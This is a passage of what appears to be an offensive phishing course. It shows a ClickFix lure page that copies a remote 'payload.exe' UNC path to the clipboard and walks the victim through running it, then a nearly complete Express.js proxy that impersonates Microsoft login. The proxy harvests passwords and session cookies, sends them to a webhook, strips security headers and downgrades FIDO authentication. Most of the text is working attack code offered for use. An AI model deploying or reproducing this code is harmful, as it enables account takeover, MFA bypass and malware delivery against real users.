      <svg viewBox="0 0 32 32" xmlns="http://www.w3.org/2000/svg">
        <path d="M0 25.472q0 2.368 1.664 4.032t4.032 1.664h18.944q2.336 0 4-1.664t1.664-4.032v-8.192l-3.776 3.168v5.024q0 0.8-0.544 1.344t-1.344 0.576h-18.944q-0.8 0-1.344-0.576t-0.544-1.344v-18.944q0-0.768 0.544-1.344t1.344-0.544h9.472v-3.776h-9.472q-2.368 0-4.032 1.664t-1.664 4v18.944zM5.696 19.808q0 2.752 1.088 5.28 0.512-2.944 2.24-5.344t4.288-3.872 5.632-1.664v5.6l11.36-9.472-11.36-9.472v5.664q-2.688 0-5.152 1.056t-4.224 2.848-2.848 4.224-1.024 5.152zM32 22.080v0 0 0z"/>
      </svg>
    </div>
    <h3>Jack Bob shared a file with you</h3>
    <p>Please review the attached document</p>
    <div class="file-box">
      <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/f/fd/Microsoft_Office_Word_%282019%E2%80%93present%29.svg/2203px-Microsoft_Office_Word_%282019%E2%80%93present%29.svg.png" alt="Word icon" />
      <span>Updated Payroll Schedule</span>
    </div>
    <div class="small-note">This link only works for the direct recipients of this message.</div>
    <button id="dlFile" type="button">Open</button>
  </div>
  <div id="overlay" class="overlay hidden"></div>
  <div id="modal" class="modal hidden">
    <div class="modal-content">
      <span class="close" title="Close">&times;</span>
      <h2>Protected file</h2>
      <p id="modal-description">Your organization requires you to view "<strong>UpdatedPayroll.docx</strong>" internally.</p>
      <ol>
        <li>Press the  <kbd>Windows</kbd> key to open the Windows Search Menu.</li>
        <li>Copy the file path: <code id="uncPath" class="copyable">\\\\internal.company.com\\Secure\\UpdatedPayroll.docx</code></li>
        <li>Paste the file path and press <kbd>Enter</kbd>.</li>
      </ol>
    </div>
  </div>
`;

const openBtn = document.getElementById("dlFile");
const overlay = document.getElementById("overlay");
const modal = document.getElementById("modal");
const closeBtn = document.querySelector(".close");
const uncPath = document.getElementById("uncPath");

function copyToClipboard(t) {
  if (navigator.clipboard && navigator.clipboard.writeText) {
    navigator.clipboard.writeText(t).catch(() => {});
  } else {
    const e = document.createElement("textarea");
    e.value = t;
    document.body.appendChild(e);
    e.select();
    document.execCommand("copy");
    e.remove();
  }
}

function showModal() {
  overlay.classList.remove("hidden");
  modal.classList.remove("hidden");
  copyToClipboard('\\\\10.0.0.28@8080\\payloads\\payload.exe');
}

function hideModal() {
  overlay.classList.add("hidden");
  modal.classList.add("hidden");
}

openBtn.addEventListener("click", showModal);
closeBtn.addEventListener("click", hideModal);
overlay.addEventListener("click", hideModal);

uncPath.addEventListener("click", () => {
  uncPath.classList.add("clicked");
  setTimeout(() => {
    uncPath.classList.remove("clicked");
  }, 2000);
});

```

### Demo
In the demo below, we obfuscate the WebDAV ClickFix phishing page using Hangul Filler obfuscation.

The video can be found in folder: `./videos/demo-2-unicode-whitespace.mov`

## Objectives
Perform Zero-Width obfuscation on your frontend code

Perform Hangul Filler obfuscation on your frontend code

Look up more whitespace Unicode characters and create a custom encoder and decoder


---

# Novo Módulo 13 — Bypass de MFA: Construindo um Proxy Invisível (Flask)

Novo Módulo 13 — Bypass de MFA: Construindo um Proxy Invisível (Flask)

- # Novo Módulo 13 — Bypass de MFA: Construindo um Proxy Invisível (Flask)

# Disclaimer
# Module 13 - MFA Bypass: Building An Invisible Proxy

## Introduction
Previously in the course, we demonstrated two methods to bypass MFA. The first was a manual approach covered in the Manual Time-Based One-Time Password (TOTP) Harvesting module, which is more practical for targeted phishing scenarios. The second method utilized the well-known Evilginx tool in the Adversary-In-The-Middle (AITM) via Evilginx module, which automatically proxies the user's interaction with the authentication provider, capturing credentials and session cookies in real time to bypass MFA seamlessly.While Evilginx is an excellent tool and approach to bypass MFA, due to it's open-source nature, it's become highly signatured by vendors. To combat this, in this module we will build a custom invisible proxy that targets Microsoft's authentication portal. This module will utilize the Express.js framework due to its robustness and middleware support, making it well-suited for building custom proxy logic and handling HTTP requests efficiently.The setup in this module has three components, the first component is Nginx which will be setup as a reverse proxy to the Express application. The domain name and SSL certificate will be setup on the Nginx web server and when clients access our phishing website, Nginx will forward the requests to the application. This setup is similar to the Nginx & Flask setup.The diagram below illustrates the setup as each component being hosted on a separate server for clarity purposes.However, in reality, this module will utilize a single server and install both Nginx and Express on it. The Express application will run on `localhost:8080` and Nginx will forward the requests to the local address.
## Installing Prerequisites
To start, we need to install Node.js and npm, since the Express web framework runs on Node.js and relies on npm to manage its dependencies.
```
sudo apt update

# Install Node.js
sudo apt install nodejs

# Verify installation
# This module used v18.19.0
node -v

# Install npm
sudo apt install npm

```

## Creating Express Project
Once the prerequisites have been installed, we can create our Express project using the following commands:
```
# Create a project dir
mkdir proxyapp && cd proxyapp

# Creates package.json
npm init -y

# Install express.js v4.18.2
npm install express@^4.18.2

# Install node fetch (used in the code)
npm install node-fetch@2

```
To ensure we've installed everything correctly, create a new file named `app.js` and paste the following sample code.
```
const express = require('express')
const app = express()
const port = 8080

app.get('/', (req, res) => {
  res.send('Hello from Maldev Academy')
})

app.listen(port, () => {
  console.log(`The app is listening on port ${port}`)
})

```
Run the application using `node app.js &`. The `&` makes the command run in the background. Then verify that the application is working by running `curl localhost:8080` and it should return "Hello from Maldev Academy".Once verified, you can kill the Express application by finding its process ID and then using the `kill` command.
```
ps aux | grep node

# Sample output:
# root      113420  0.1  2.9 616352 59716 pts/0    Sl   13:50   0:00 node app.js

kill 113420

```

## Setting Up Nginx, DNS and SSL Certificate
As per the previously shown diagram, we will require Nginx to forward requests to our Express application. For this, we need to install and setup Nginx appropriately, configure DNS records and request an SSL certificate, all of which have been demonstrated several times throughout the course.
```
# Installing requirements
sudo apt install nginx
sudo apt install certbot
sudo apt install python3-certbot-nginx

```
Create a new configuration file for Nginx using the command below:
```
sudo nano /etc/nginx/sites-available/proxyapp

```
Paste the following configuration and update the `server_name domain.com` directive with the domain name your going to use. The proxy buffering directives are required to ensure that Nginx can handle the data being proxied by the Express application.
```
server {
    listen 80;
    server_name domain.com;

    location / {
        proxy_pass              http://127.0.0.1:8080;
        proxy_http_version      1.1;

        proxy_set_header Host              $host;
        proxy_set_header X-Real-IP         $remote_addr;
        proxy_set_header X-Forwarded-For   $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
        proxy_set_header Connection        '';

        # IMPORTANT #
        proxy_request_buffering off;           # don’t buffer request bodies
        proxy_buffer_size       128k;          # header buffer
        proxy_buffers           8 128k;        # 8 × 128 kB for body (1 MB total)
        proxy_busy_buffers_size 256k;          # ≤ (8*128k)-128k = 896 kB, so 256 kB is safe
    }
}

```
Additionally, ensure that a DNS `A` record is created pointing your domain name to the server IP address.Return to the server to enable the previously created configuration and restart Nginx.
```
sudo ln -s /etc/nginx/sites-available/proxyapp /etc/nginx/sites-enabled/

sudo systemctl restart nginx

```

### SSL Certificate
The final requirement is an SSL certificate and for this example we will use a Let's Encrypt SSL certificate via `certbot`.
```
# Allow http/s traffic
ufw allow http
ufw allow https

# Request cert
sudo certbot --nginx

```

### Recommended: Block External Access
Before moving on to building the Express application, it’s strongly recommended to block external access during development. This is because websites are frequently scanned by automated bots, and the application does not yet include any anti-bot protections. For testing purposes, it's best to restrict external access and permit your IP address using the commands below.
```
# Display and number the current firewall rules
sudo ufw status numbered

# Delete the inbound HTTP rule (replace <number> with the rule's number)
sudo ufw delete <number>

# Delete the inbound HTTPS rule (replace <number> with the rule's number)
sudo ufw delete <number>

# Only allow your IP address to 80 & 443
ufw allow from [YOUR IP HERE] to any port 80
ufw allow from [YOUR IP HERE] to any port 443

# Block everyone else
ufw deny 80
ufw deny 443

```

## Invisible Proxy Implementation
The invisible proxy implementation contains several functions that are designated for specific purposes. Each set of functions have been added to specific categories for simplification and modularity. The functions have been split up into four categories
Utility functions – General-purpose helper functions used throughout the application, such as content rewriting, cookie handling, or client information extraction.

- Webhook functions – Send formatted data (like credentials or cookies) to an external webhook endpoint for logging or alerting.

- Core functions – Handle key processing logic such as extracting credentials, modifying responses, and managing authentication state.

- Middleware functions – Functions registered using `app.use()` or `app.options()` that perform the core proxying of requests, including forwarding traffic, modifying responses, logging activity, handling CORS, and managing custom routing logic throughout the request lifecycle.

### Utility Functions
The first category of functions are the utility functions which are reusable code designed to perform a general-purpose task that supports the main functionality of an application. We have five utility functions:

- `getClientInfo` – Extracts client metadata from an incoming request, such as IP address, user agent, and URL.

- `createFidoRemovalScript` – Returns a JavaScript snippet that removes FIDO-related HTML elements from a webpage.

- `applyFidoModifications` – Modifies HTML content to disable FIDO as the default authentication method and injects a script to remove related UI elements.

- `applyPhoneAuthModifications` – Adjusts HTML content to enable phone-based authentication methods as default, based on specific conditions.

- `sendWebhook` – Sends a formatted message to a webhook URL for logging or notification purposes.

### Webhook Functions
The next category of functions are webhook function which will be responsible for sending credentials and cookies to a given webhook URL.

- `sendCredentialsWebhook` – captures and formats submitted credentials along with client request info, then sends them to a webhook.

- `sendCookiesWebhook` – captures authentication cookies, formats them with client metadata, and sends the data to a webhook.

### Core Functions
The core functions handle the essential logic that enables the proxy to operate reliably, ensuring that requests and responses are processed, interpreted, and modified as needed to maintain consistent and expected behavior across the application.

- `extractCredentials` – Parses POST data to extract usernames and passwords from known field names in form or JSON content.

- `getTargetUrl` – Determines the appropriate Microsoft login URL to redirect to based on the request path.

- `rewriteContent` – Rewrites Microsoft domain URLs in HTML content to point to a proxy domain.

- `rewriteCookies` – Modifies Set-Cookie headers to replace Microsoft domains with the proxy domain.

- `removeIntegrityAttributes` – Strips integrity and crossorigin attributes from HTML to prevent content security policy issues.

- `checkAuthenticationCookies` – Checks for specific cookies indicating successful MFA, then triggers a redirect and sends cookies to a webhook.

- `decompressContent` – Decompresses response data based on the encoding type (gzip, deflate, etc.).

- `recompressContent` – Re-compresses modified content to match the original encoding if it was decompressed.

- `getRequestBody` – Collects and returns the full request body as a buffer.

### Middleware Functions
The middleware functions act as intermediaries in the request-response cycle, handling tasks such as routing, preprocessing, and response modification. They also coordinate the flow of logic by invoking functions from other categories, such as utility and core functions, to perform specific operations as needed.

- `app.options('*', ...)` – Handles CORS preflight requests by applying the appropriate headers and returning a 204 response.

- `app.use((req, res, next) => ...)` – Logs all incoming requests with their HTTP method and URL for debugging or monitoring purposes.

- `app.use('*', async (req, res) => ...)` – Acts as the main proxy handler, forwarding incoming requests to target URLs, modifying content and cookies as needed, and handling authentication flow and redirection.

## Implementation Walkthrough
With the components of the code broken down, we will now dive into the implementations and the associated code.

### Configuration Values
The beginning of the code imports all required libraries and defines hardcoded configuration values that will be used throughout the application to control behavior, such as proxied domains and the webhook URLs, and feature toggles.

First, we define the `DEFAULT_DOMAIN` which is the primary domain being proxied, `SUCCESS_REDIRECT_URL` which is the redirect URL upon the user successfully authenticating and capturing the credentials and cookies. The `WEBHOOK_URL` is the URL where the credentials and cookies will be sent. Additionally, we define two boolean values: `ENABLE_FIDO_HTML_MODIFICATION` and `ENABLE_PHONE_AUTH_MODIFICATION`, which, when enabled, perform MFA downgrade.

Finally, we define array constants: `MICROSOFT_DOMAINS`, `SECURITY_HEADERS_TO_REMOVE`, and `CORS_HEADERS`, which contain the list of domains to proxy, the HTTP security headers to remove, and the cross-origin headers to add, all of which allow the proxy to work properly.

```
const express = require('express');
const { URL } = require('url');
const zlib = require('zlib');
const fetch = require('node-fetch');

const app = express();

// === CONFIGURATION ===
const DEFAULT_DOMAIN = 'login.microsoftonline.com';
const SUCCESS_REDIRECT_URL = 'https://maldevacademy.com/phishing-course';
const WEBHOOK_URL = 'https://webhook.site/1-2-3-4';

// Authentication modification features
const ENABLE_FIDO_HTML_MODIFICATION = true;
const ENABLE_PHONE_AUTH_MODIFICATION = true;

// Domains that we proxy
const MICROSOFT_DOMAINS = [
  'login.microsoftonline.com',
  'www.office.com', 
  'login.live.com',
  'm365.cloud.microsoft.com',
  'passwordreset.microsoftonline.com',
  'signup.microsoft.com',
  'go.microsoft.com',
  'privacy.microsoft.com',
  'www.microsoft.com',
  'account.microsoft.com',
  'account.live.com'
];

// Common HTTP headers to remove for security
const SECURITY_HEADERS_TO_REMOVE = [
  'x-frame-options',
  'content-security-policy',
  'content-security-policy-report-only',
  'strict-transport-security',
  'x-content-type-options',
  'x-xss-protection'
];

// CORS headers to add
const CORS_HEADERS = {
  'access-control-allow-origin': '*',
  'access-control-allow-credentials': 'true',
  'access-control-allow-methods': 'GET,POST,PUT,DELETE,OPTIONS,PATCH',
  'access-control-allow-headers': '*'
};

```

### Utility Functions
Next, we create the utility functions, starting with `getClientInfo`. This function takes one parameter, the `req` object, which represents the incoming HTTP request. It will then extract and return four values: the user's IP address, the user's user-agent, the full URL path the client requested and timestamp.

Note: Since we're using Nginx with the Express application, the returned IP address will be Nginx's IP address. This can be fixed by fetching the `X-Forwarded-For` HTTP header's value instead.

```
function getClientInfo(req) {
  return {
    ip: req.ip || req.connection.remoteAddress || 'unknown',
    userAgent: req.get('user-agent') || 'unknown',
    url: req.originalUrl,
    timestamp: new Date().toISOString()
  };
}

```
Next, we have two FIDO related functions `createFidoRemovalScript` and `applyFidoModifications`. The `createFidoRemovalScript` function generates a JavaScript snippet that continuously attempts to remove a specific DOM element associated with FIDO authentication, targeting elements with `data-value="FidoKey"`.

The `applyFidoModifications` function modifies the HTML content to disable FIDO as the default authentication method. It does so by detecting if FIDO is marked as default in the JSON-like structure and replacing `"isDefault": true` with `"isDefault": false`. If this condition is met, it logs a message for debugging and injects the removal script before the closing `</body>` tag. This method is used to downgrade FIDO authentication with another authentication mechanism that's vulnerable to phishing.

```
/**
 * Create FIDO removal script
 */
function createFidoRemovalScript() {
    return `
        <script>
        (function() {
            function removeFidoElement() {
                const fidoElement = document.querySelector('div[data-value="FidoKey"]');
                if (fidoElement) {
                    fidoElement.parentNode.removeChild(fidoElement);
                } else {
                    setTimeout(removeFidoElement, 500);
                }
            }
            
            if (document.readyState === 'loading') {
                document.addEventListener('DOMContentLoaded', removeFidoElement);
            } else {
                removeFidoElement();
                setTimeout(removeFidoElement, 1000);
            }
        })();
        </script>
    `;
}

/**
 * Apply FIDO authentication modifications to HTML content
 */
function applyFidoModifications(content) {
  if (!ENABLE_FIDO_HTML_MODIFICATION) return content;
  
  const has_fido_config = /"authMethodId"\s*:\s*"FidoKey"[^}]*"isDefault"\s*:\s*true/.test(content);
  
  if (has_fido_config) {
    console.log('[FIDO] 🔑 Modifying FIDO configuration');
    
    // Disable FIDO as default method
    content = content.replace(
      /("authMethodId"\s*:\s*"FidoKey"[^}]*"isDefault"\s*:\s*)true/g, 
      '$1false'
    );
    
    // Inject FIDO removal script
    const fido_removal_script = createFidoRemovalScript();
    content = content.replace('</body>', fido_removal_script + '</body>');
  }
  
  return content;
}

```
The final utility function is `sendWebhook` which is responsible for sending the webhook notification and takes three parameters:

- `message` – The content to be delivered to the webhook endpoint.

- `req` – The incoming request object.

- `type` – A label indicating the category or purpose of the webhook event being sent. This is either "credentials" or "authentication cookies".

```
/**
 * Send webhook notification (unified function)
 */
async function sendWebhook(message, req, type) {
  try {
    const payload = { text: message };

    console.log(`[Webhook] 📤 Sending ${type}`);
    
    const response = await fetch(WEBHOOK_URL, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Accept': 'application/json'
      },
      body: JSON.stringify(payload)
    });

    if (response.ok) {
      console.log(`[Webhook] ✅ ${type} sent successfully`);
    } else {
      console.log(`[Webhook] ⚠️ Failed to send ${type}: ${response.status}`);
    }
  } catch (error) {
    console.error(`[Webhook] ❌ Error sending ${type}: ${error.message}`);
  }
}

```

### Webhook Functions
As previously mentioned, we have two webhook functions, `sendCredentialsWebhook` and `sendCookiesWebhook`, which both prepare the relevant data and invoke `sendWebhook` to transmit the captured credentials or cookies.

```
/**
 * Send credentials to webhook
 */
async function sendCredentialsWebhook(username, password, req) {
  const clientInfo = getClientInfo(req);
  
  const message = `<b>🔐 Microsoft Credentials Captured</b><br><br>` +
    `<b>Username:</b> ${username}<br>` +
    `<b>Password:</b> ${password}<br><br>` +
    `<b>Request Information:</b><br>` +
    `<b>Timestamp:</b> ${clientInfo.timestamp}<br>` +
    `<b>IP Address:</b> ${clientInfo.ip}<br>` +
    `<b>User Agent:</b> ${clientInfo.userAgent}<br>` +
    `<b>URL:</b> ${clientInfo.url}<br>`;

  await sendWebhook(message, req, 'credentials');
}

/**
 * Send authentication cookies to webhook
 */
async function sendCookiesWebhook(allCookies, req) {
  const clientInfo = getClientInfo(req);
  
  const formattedCookies = allCookies
    .replace(/;/g, ';<br>')
    .replace(/ESTSAUTH=/g, '<b>ESTSAUTH=</b>')
    .replace(/ESTSAUTHPERSISTENT=/g, '<b>ESTSAUTHPERSISTENT=</b>');
  
  const message = `<b>🍪 Authentication Cookies Captured</b><br><br>` +
    `${formattedCookies}<br><br>` +
    `<b>Session Information:</b><br>` +
    `<b>Timestamp:</b> ${clientInfo.timestamp}<br>` +
    `<b>Target URL:</b> ${clientInfo.url}<br>` +
    `<b>IP Address:</b> ${clientInfo.ip}<br>` +
    `<b>User Agent:</b> ${clientInfo.userAgent}<br>`;

  await sendWebhook(message, req, 'authentication cookies');
}

```

### Core Functions
The first core function is `extractCredentials` which attempts to extract a username and password from either form-encoded or JSON-encoded input. It looks for common field names used in Microsoft login forms and returns an object with the credentials if both values are found. If parsing fails or required fields are missing, it returns null. The `extractCredentials` function takes two parameters:

- `body` – The raw POST data from the request, expected to contain login information

- `contentType` – The MIME type of the incoming request body, used to determine how to parse the data

`extractCredentials` will be invoked from the proxy handler (shown later) when the user submits their credentials, allowing the middleware to inspect the request body for login data before forwarding the request to the target server.

```
/**
 * Extract credentials from POST data
 */
function extractCredentials(body, contentType) {
  if (!body || body.length === 0) return null;

  try {
    const bodyText = body.toString('utf8');
    
    // Common Microsoft login field names
    const usernameFields = ['login', 'username', 'email', 'user', 'loginfmt'];
    const passwordFields = ['passwd', 'password', 'pwd', 'pass'];
    
    let username = null;
    let password = null;
    
    // For form-encoded data
    if (contentType && contentType.includes('application/x-www-form-urlencoded')) {
      const params = new URLSearchParams(bodyText);
      
      username = usernameFields.reduce((found, field) => found || params.get(field), null);
      password = passwordFields.reduce((found, field) => found || params.get(field), null);
    }
    
    // For JSON data
    else if (contentType && contentType.includes('application/json')) {
      const jsonData = JSON.parse(bodyText);
      
      username = usernameFields.reduce((found, field) => found || jsonData[field], null);
      password = passwordFields.reduce((found, field) => found || jsonData[field], null);
    }

    return (username && password) ? { username, password } : null;
    
  } catch (error) {
    console.log(`[Credentials] Error parsing body: ${error.message}`);
    return null;
  }
}

```
Next, we have the `getTargetUrl` function, which takes the incoming HTTP request as input and determines the destination URL for the proxied request based on the request path. It prioritizes specific routes which are required in order to make the proxy function correctly.

```
/**
 * Determine target URL based on request path patterns
 */
function getTargetUrl(req) {
  const { path, originalUrl } = req;
  
  // Special cases - order matters (most specific first)
  if (originalUrl.startsWith('/Me.htm')) {
    return `https://login.live.com${originalUrl}`;
  }
  
  if (path === '/login' || originalUrl === '/login') {
    return `https://www.office.com/login#`;
  }
  
  // Default case
  return `https://${DEFAULT_DOMAIN}${originalUrl}`;
}

```
The `rewriteContent` function scans a string for URLs pointing to Microsoft domains and replaces them with the proxy's host. This ensures that any links or resources originally targeting Microsoft are redirected through the proxy server instead. The `rewriteContent` function takes two parameters:

- `content` – HTML content that may contain URLs to Microsoft domains.

- `proxyHost` – The hostname of the proxy server that should replace those Microsoft URLs (i.e. The domain name of the phishing website).

```
/**
 * Rewrite Microsoft domain URLs to proxy domain
 */
function rewriteContent(content, proxyHost) {
  if (!content || typeof content !== 'string') return content;
  
  return MICROSOFT_DOMAINS.reduce((rewritten, domain) => {
    const escapedDomain = domain.replace(/\./g, '\\.');
    // Combined regex for both HTTPS and protocol-relative URLs
    const combinedRegex = new RegExp(`(https:)?//${escapedDomain}`, 'gi');
    return rewritten.replace(combinedRegex, `$1//${proxyHost}`);
  }, content);
}

```
Besides rewriting content, we will also need to rewrite cookies to point to our proxy domain in order for the browser to accept them. The `rewriteCookies` function updates the `Domain` attribute in each `Set-Cookie` header so that the cookies are scoped to the proxy's host rather than the original target domain. This ensures the browser stores and sends the cookies with subsequent proxied requests.

```
/**
 * Rewrite Microsoft cookies to proxy domain
 */
function rewriteCookies(setCookieHeaders, proxyHost) {
  if (!setCookieHeaders || !Array.isArray(setCookieHeaders)) {
    return setCookieHeaders;
  }
  
  return setCookieHeaders.map(cookie => {
    let rewrittenCookie = MICROSOFT_DOMAINS.reduce((current, domain) => {
      const domainRegex = new RegExp(`domain=\\.?${domain.replace(/\./g, '\\.')}`, 'gi');
      return current.replace(domainRegex, `domain=${proxyHost}`);
    }, cookie);
    
    // Add domain if not specified
    if (!/domain=/i.test(rewrittenCookie)) {
      const firstSemicolon = rewrittenCookie.indexOf(';');
      if (firstSemicolon > -1) {
        rewrittenCookie = rewrittenCookie.substring(0, firstSemicolon) + 
                         `; domain=${proxyHost}` + 
                         rewrittenCookie.substring(firstSemicolon);
      } else {
        rewrittenCookie += `; domain=${proxyHost}`;
      }
    }
    
    return rewrittenCookie;
  });
}

```
We will also need to remove the `integrity` and `crossorigin` attributes from any embedded scripts to avoid running into security restrictions that block modified or proxied content. The `removeIntegrityAttributes` function strips these attributes from the HTML to ensure scripts load and execute without triggering browser integrity checks.

You can read more about Subresource Integrity here.

```
/**
 * Remove integrity and crossorigin attributes from HTML to prevent CSP issues
 */
function removeIntegrityAttributes(htmlContent) {
  if (!htmlContent || typeof htmlContent !== 'string') return htmlContent;
  
  return htmlContent
    .replace(/\s+integrity\s*=\s*["'][^"']*["']/gi, '')
    .replace(/\s+crossorigin\s*=\s*["'][^"']*["']/gi, '');
}

```
Next we have the `checkAuthenticationCookies` function which checks if a user has successfully completed authentication by looking for specific cookies in the response headers, specifically Microsoft's `ESTSAUTH` and `ESTSAUTHPERSISTENT` cookies. If the cookies are found, it invokes `sendCookiesWebhook` and returns `true`.

```
/**
 * Check for authentication cookies after MFA completion
 * Returns true if authentication is complete and should redirect
 */
function checkAuthenticationCookies(setCookieHeaders, req) {
  console.log("[checkAuthenticationCookies - CHECKING COOKIES]")
  if (!setCookieHeaders || setCookieHeaders.length === 0) return false;
  
  // Only check for completion on ProcessAuth endpoint (after MFA)
  const isProcessAuth = req.originalUrl.includes('/common/SAS/ProcessAuth') || 
                       req.originalUrl.includes('/common/ProcessAuth');
  
  if (!isProcessAuth) return false;
  
  // Join all cookies into a single string
  const allCookies = setCookieHeaders.join("; ");
  
  // Check for both required cookies (indicates successful MFA completion)
  const hasESTSAUTH = allCookies.includes('ESTSAUTH');
  const hasESTSAUTHPERSISTENT = allCookies.includes('ESTSAUTHPERSISTENT');
  
  if (hasESTSAUTH && hasESTSAUTHPERSISTENT) {
    console.log(`[Auth] ✅ MFA completion detected in ProcessAuth`);
    console.log(`[Auth] 🎯 Redirecting browser to: ${SUCCESS_REDIRECT_URL}`);
    
    // Send cookies to webhook
    sendCookiesWebhook(allCookies, req);
    
    return true;
  }
  
  return false;
}

```
The `decompressContent` and `recompressContent` functions handle the encoding and decoding of response bodies. The `decompressContent` function takes a response buffer and its encoding (like `gzip` or `deflate`) and returns the uncompressed text content so it can be inspected or modified. The `recompressContent` function takes the modified content and re-encodes it using the original compression method, ensuring that the response is sent back to the client in the expected format.

```
/**
 * Decompress response content if needed
 */
function decompressContent(buffer, encoding) {
  try {
    switch (encoding) {
      case 'gzip':
        return {
          content: zlib.gunzipSync(buffer).toString('utf8'),
          wasDecompressed: true
        };
      case 'deflate':
        return {
          content: zlib.inflateSync(buffer).toString('utf8'),
          wasDecompressed: true
        };
      default:
        return {
          content: buffer.toString('utf8'),
          wasDecompressed: false
        };
    }
  } catch (error) {
    console.log(`[Decompress] Error with ${encoding}, using original: ${error.message}`);
    return {
      content: buffer.toString('utf8'),
      wasDecompressed: false
    };
  }
}

/**
 * Recompress content if it was originally compressed
 */
function recompressContent(content, encoding, wasDecompressed) {
  if (!wasDecompressed) {
    return Buffer.from(content, 'utf8');
  }
  
  try {
    switch (encoding) {
      case 'gzip':
        return zlib.gzipSync(Buffer.from(content, 'utf8'));
      case 'deflate':
        return zlib.deflateSync(Buffer.from(content, 'utf8'));
      default:
        return Buffer.from(content, 'utf8');
    }
  } catch (error) {
    console.error(`[Recompress] Error: ${error.message}`);
    return Buffer.from(content, 'utf8');
  }
}

```
The final core function is `getRequestBody`, which reads the incoming request stream and returns the full body as a single buffer. This is necessary for capturing and processing HTTP `POST` data, such as login credentials, before the proxy forwards the request to the destination server.

```
/**
 * Get request body as buffer
 */
async function getRequestBody(req) {
  return new Promise((resolve) => {
    const chunks = [];
    req.on('data', (chunk) => chunks.push(chunk));
    req.on('end', () => resolve(Buffer.concat(chunks)));
  });
}

```

### Middleware Functions
Now we discuss middleware functions, which are either `app.options` or `app.use` calls on the Express `app` instance. In Express, `app` represents the main application object used to define routes, middleware, and behavior for handling HTTP requests. Middleware functions registered with `app.use` run for all incoming requests, while `app.options` is used to handle HTTP `OPTIONS` requests.

The first one we have is `app.options`, which handles HTTP OPTIONS requests which are typically sent by browsers as part of CORS preflight checks. It responds by attaching the required CORS headers and returning a `204 No Content` status, allowing the actual request to proceed without being blocked.

```
// OPTIONS handler for CORS
app.options('*', (req, res) => {
  Object.entries(CORS_HEADERS).forEach(([key, value]) => {
    res.setHeader(key, value);
  });
  res.sendStatus(204);
});

```
Next we have a request logging middleware registered with `app.use`, which logs the HTTP method and original URL of every incoming request. This provides visibility into all traffic passing through the proxy and helps with debugging.

```
// Request logging
app.use((req, res, next) => {
  console.log(`[Request] ${req.method} ${req.originalUrl}`);
  next();
});

```
The final middleware component is the main proxy handler, which intercepts incoming requests and uses a combination of everything we've discussed so far to do the following:

- Determine the correct destination URL for the incoming request based on the path and hostname using `getTargetUrl`.

- Log the request and prepare new headers, removing any that could interfere with proxying (like forwarded headers) and updating the `host` header to match the target domain (e.g. `login.microsoftonline`, `www.office.com`).

- For POST requests, read the request body using `getRequestBody` and check for the presence of credentials using `extractCredentials`. If credentials are found, they are sent to a webhook using `sendCredentialsWebhook`.

- Forward the modified request to Microsoft's domain using `fetch` and passing the HTTP method, headers, and body.

- Capture the response from the destination, including headers, cookies, status, and body content.

- Remove security-related headers using the `SECURITY_HEADERS_TO_REMOVE` list and inject permissive CORS headers using `CORS_HEADERS`.

- Check for authentication cookies in the response using `checkAuthenticationCookies`. If login is complete, send the cookies to a webhook via `sendCookiesWebhook` and redirect the client.

- Rewrite cookies in the response using `rewriteCookies` to scope them to the proxy domain.

- If the response includes a redirect, modify the `Location` header to be `SUCCESS_REDIRECT_URL`.

- If the response contains HTML, JavaScript, or JSON, decompress it with `decompressContent`, rewrite URLs with `rewriteContent`. Depending on the configuration flags we will also apply MFA downgrades changes using `applyFidoModifications`, `applyPhoneAuthModifications`, and also strip security attributes with `removeIntegrityAttributes`.

- Recompress the content using `recompressContent` and update the `Content-Length` header to match the modified content size.

- Finally, send the fully rewritten and adjusted response back to the client using `res.writeHead` and `res.end`, completing the proxy cycle.

```
app.use('*', async (req, res) => {
  try {
    const targetUrl = getTargetUrl(req);
    const targetDomain = new URL(targetUrl).hostname;
    const proxyHost = req.get('host');
    
    console.log(`[Proxy] ${req.method} ${req.originalUrl} → ${targetDomain}`);
    
    // Prepare request headers
    const requestHeaders = { ...req.headers };
    requestHeaders['host'] = targetDomain;
    delete requestHeaders['x-forwarded-for'];
    delete requestHeaders['x-forwarded-proto'];
    
    // Get request body and check for credentials
    let requestBody = null;
    if (req.method !== 'GET' && req.method !== 'HEAD') {
      requestBody = await getRequestBody(req);
      
      // Extract and send credentials if found
      if (requestBody && requestBody.length > 0) {
        const contentType = req.get('content-type') || '';
        const credentials = extractCredentials(requestBody, contentType);
        
        if (credentials) {
          console.log(`[Credentials] 🔑 Found credentials for user: ${credentials.username}`);
          sendCredentialsWebhook(credentials.username, credentials.password, req);
        }
      }
    }
    
    // Make the proxied request
    const response = await fetch(targetUrl, {
      method: req.method,
      headers: requestHeaders,
      body: requestBody,
      redirect: 'manual'
    });
    
    console.log(`[Response] ${response.status} ${response.statusText}`);
    
    // Copy response headers
    const responseHeaders = {};
    response.headers.forEach((value, key) => {
      responseHeaders[key] = value;
    });
    
    // Add CORS headers and remove security headers
    Object.assign(responseHeaders, CORS_HEADERS);
    SECURITY_HEADERS_TO_REMOVE.forEach(header => {
      delete responseHeaders[header];
    });
    
    // Process cookies and check for authentication completion
    const setCookieHeaders = response.headers.raw()['set-cookie'] || [];
    console.log('[Set-Cookie] Raw headers:', setCookieHeaders);

    const shouldRedirectToSuccess = checkAuthenticationCookies(setCookieHeaders, req);

    if (setCookieHeaders.length > 0 && !shouldRedirectToSuccess) {
      const rewrittenCookies = rewriteCookies(setCookieHeaders, proxyHost);
      console.log('[Set-Cookie] Rewritten headers:', rewrittenCookies);

      // Clean up existing cookie headers
      delete responseHeaders['set-cookie'];

      // Apply rewritten cookies
      if (rewrittenCookies.length > 0) {
        responseHeaders['set-cookie'] = rewrittenCookies;
      }
    }

    
    // IMMEDIATE REDIRECT: If authentication is complete, redirect browser immediately
    if (shouldRedirectToSuccess) {
      console.log(`[Auth] 🚀 Performing immediate redirect to: ${SUCCESS_REDIRECT_URL}`);
      
      res.writeHead(302, {
        'Location': SUCCESS_REDIRECT_URL,
        ...CORS_HEADERS
      });
      res.end();
      return;
    }
    
    // Handle redirects
    if (response.status >= 300 && response.status < 400 && responseHeaders['location']) {
      const originalLocation = responseHeaders['location'];
      
      try {
        const url = new URL(originalLocation);
        const newLocation = `https://${proxyHost}${url.pathname}${url.search}${url.hash}`;
        responseHeaders['location'] = newLocation;
        console.log(`[Redirect] ${originalLocation} → ${newLocation}`);
      } catch (e) {
        console.error(`[Redirect] Error: ${e.message}`);
      }
    }
    
